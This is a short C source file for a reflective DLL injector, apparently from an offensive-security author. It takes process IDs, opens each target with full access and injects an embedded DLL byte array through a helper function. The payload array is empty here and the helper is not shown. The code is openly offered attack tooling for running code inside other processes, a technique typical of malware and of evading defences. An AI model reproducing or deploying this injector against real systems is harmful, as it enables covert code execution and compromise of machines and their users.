/*
    author: 
    hasbiyama (@3xploitZero)
    github.com/hasbiyama

    gcc -o hReflectiveLoader hReflectiveLoader.c -s -masm=intel -O3

*/

#include "hReflectiveLoader\allocateExecute.h"

BYTE dllHexData[] = { };
SIZE_T dllSize = sizeof(dllHexData);

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("\n>> Usage: %s <PID> [PID ...]\n", argv[0]);
        return EXIT_FAILURE;
    }

    for (int i = 1; i < argc; ++i) {
        char* endPtr = NULL;
        DWORD pid = strtoul(argv[i], &endPtr, 10);

        if (*endPtr != '\0' || pid == 0) {
            LOG_ERROR("Invalid PID: %s", argv[i]);
            continue;
        }

        if (openInject(pid) != ERROR_SUCCESS) {
            LOG_ERROR("Injection failed for PID %lu", pid);
        }
    }

    return EXIT_SUCCESS;
}

DWORD openInject(DWORD pid) {
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!processHandle) {
        return displayError("Unable to open target process");
    }

    if (!allocateExecute(processHandle, dllHexData, dllSize)) {
        CloseHandle(processHandle);
        return displayError("DLL injection failed");
    }

    LOG_INFO("DLL successfully injected into process with PID %lu", pid);
    CloseHandle(processHandle);
    return ERROR_SUCCESS;
}